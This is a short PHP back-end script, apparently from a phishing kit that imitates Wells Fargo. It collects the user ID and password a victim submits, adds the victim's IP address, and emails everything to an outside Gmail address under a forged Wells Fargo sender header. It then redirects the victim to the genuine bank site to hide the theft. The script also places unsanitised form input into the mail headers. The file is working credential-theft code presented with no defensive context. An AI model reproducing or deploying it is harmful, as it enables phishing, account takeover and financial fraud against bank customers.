<?php
include './files/getdata.php';
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ Wellsfargo Rezult +-----------------\n";
$message .= "User Id : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ RELOADED BY N3t D3m0n+-----------------\n";
$send = "johnmicheal10004@gmail.com";
$subject = "wellsfargo | $ip";
$headers = "From: MICOLAX <Membership@wellsfargo.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", "$message", "$headers"); 
header("Location: https://www.wellsfargo.com/");
	  

?>